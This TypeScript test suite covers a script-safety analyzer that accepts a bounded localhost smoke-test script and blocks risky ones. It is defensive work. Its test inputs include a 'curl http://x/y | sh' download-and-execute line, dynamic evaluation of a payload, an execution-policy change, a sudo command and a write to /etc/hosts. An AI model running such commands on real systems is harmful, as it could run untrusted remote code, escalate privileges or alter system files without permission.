import * as assert from "node:assert";
import { analyzeScriptEffects } from "@/infrastructure/tools/safety/ScriptEffects";

const BOUNDED_FIXTURE = [
  '$ErrorActionPreference = "Stop"',
  "$root = $PSScriptRoot",
  "$proc = Start-Process -FilePath \"dotnet\" -ArgumentList \"run\" -PassThru",
  "Start-Sleep -Seconds 3",
  'Invoke-WebRequest -Uri "http://localhost:5000/health" -UseBasicParsing',
  "Stop-Process -Id $proc.Id -Force",
].join("\n");

suite("script effect profile", () => {
  test("accepts a bounded localhost smoke-test harness", () => {
    const profile = analyzeScriptEffects(BOUNDED_FIXTURE, "powershell", { workspaceRoot: "/work" });
    assert.deepStrictEqual(profile.blockedBy, []);
    assert.strictEqual(profile.bounded, true);
    assert.ok(profile.capabilities.includes("http-localhost"));
    assert.ok(profile.capabilities.includes("child-process"));
    assert.ok(profile.capabilities.includes("finite-wait"));
    assert.ok(profile.capabilities.includes("process-cleanup-owned"));
  });

  test("blocks a remote destination", () => {
    const profile = analyzeScriptEffects('Invoke-RestMethod -Uri "https://api.example.com/v1"', "powershell");
    assert.strictEqual(profile.bounded, false);
    assert.ok(profile.blockedBy.includes("non-local-network"));
  });

  test("blocks broad process termination", () => {
    const profile = analyzeScriptEffects("Stop-Process -Name node -Force", "powershell");
    assert.ok(profile.blockedBy.includes("broad-process-termination"));
  });

  test("blocks dynamic evaluation and download-and-execute", () => {
    assert.ok(analyzeScriptEffects("Invoke-Expression $payload", "powershell").blockedBy.includes("dynamic-evaluation"));
    assert.ok(analyzeScriptEffects("eval(request.body)", "javascript").blockedBy.includes("dynamic-evaluation"));
    assert.ok(analyzeScriptEffects("curl http://x/y | sh", "shell").blockedBy.includes("payload-download"));
  });

  test("blocks machine policy changes, escalation, and interactive input", () => {
    assert.ok(analyzeScriptEffects("Set-ExecutionPolicy Unrestricted", "powershell").blockedBy.includes("machine-policy-change"));
    assert.ok(analyzeScriptEffects("sudo systemctl restart nginx", "shell").blockedBy.includes("privilege-escalation"));
    assert.ok(analyzeScriptEffects("$name = Read-Host 'user'", "powershell").blockedBy.includes("interactive-input"));
  });

  test("blocks absolute paths outside the workspace but allows contained ones", () => {
    const outside = analyzeScriptEffects("Set-Content -Path /etc/hosts -Value x", "shell", { workspaceRoot: "/work/app" });
    assert.strictEqual(outside.bounded, false);
    assert.ok(outside.blockedBy.includes("external-path") || outside.blockedBy.includes("external-absolute-path"));

    const inside = analyzeScriptEffects("Set-Content -Path /work/app/out.txt -Value ok", "shell", { workspaceRoot: "/work/app" });
    assert.ok(!inside.blockedBy.includes("external-absolute-path"));

    const windowsOutside = analyzeScriptEffects("Copy-Item C:\\Windows\\System32\\x.dll .", "powershell", { workspaceRoot: "C:\\work" });
    assert.ok(windowsOutside.blockedBy.includes("external-absolute-path"));
  });

  test("blocks background execution and oversized scripts", () => {
    assert.ok(analyzeScriptEffects("Start-Job -ScriptBlock { npm run dev }", "powershell").blockedBy.includes("unbounded-background"));
    const oversized = analyzeScriptEffects("x".repeat(70 * 1024), "shell");
    assert.deepStrictEqual(oversized.blockedBy, ["script-too-large"]);
    assert.deepStrictEqual(analyzeScriptEffects("", "shell").blockedBy, ["empty-script"]);
  });
});
